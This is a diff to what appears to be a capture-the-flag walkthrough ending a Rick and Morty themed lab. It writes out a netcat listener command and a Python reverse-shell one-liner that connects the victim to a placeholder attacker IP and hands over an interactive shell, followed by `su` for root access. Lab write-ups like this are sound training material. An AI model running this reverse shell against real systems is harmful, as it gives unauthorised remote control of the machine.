@@ -41,10 +41,13 @@ the outgoing traffic from the machine has less restrictions than ingoing traffic
 
 on our own attacker machine we setup a port listener with netcat using command: `nc -nlvp 9999`
 
-victim machine command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerIP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' -`
+victim machine command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attackerIP>",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' -`
+
+we run the `su` command and we get root access
+
+enter `cd` to navigate to root folder and there we find **3rd.txt** , the final ingredient!
+
+![rick-kiss-rick-and-morty-kiss](https://user-images.githubusercontent.com/74051842/144588709-583ddd83-4adc-49a4-9731-155c7523e842.gif)
 
 
 
-
-
-## (Bonus) Easter egg kinda?
